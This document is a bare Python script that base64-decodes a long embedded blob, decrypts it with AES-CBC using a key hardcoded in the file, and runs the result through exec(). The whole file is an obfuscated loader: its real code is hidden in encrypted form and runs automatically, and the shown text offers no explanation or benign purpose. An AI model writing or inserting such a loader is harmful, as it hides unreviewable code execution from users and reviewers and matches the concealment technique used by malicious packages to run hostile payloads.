
import base64
from Crypto.Cipher import AES

def pad(data):
    padding_length = 16 - (len(data) % 16)
    return data + (chr(padding_length) * padding_length).encode()

def unpad(data):
    return data[:-data[-1]]

encrypted_data = base64.b64decode("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")
key = bytes.fromhex("843362ef66ee38406b80eb9632ff63b2")
iv = encrypted_data[:16]
cipher = AES.new(key, AES.MODE_CBC, iv)
original_data = unpad(cipher.decrypt(encrypted_data[16:]))
exec(original_data.decode())
                
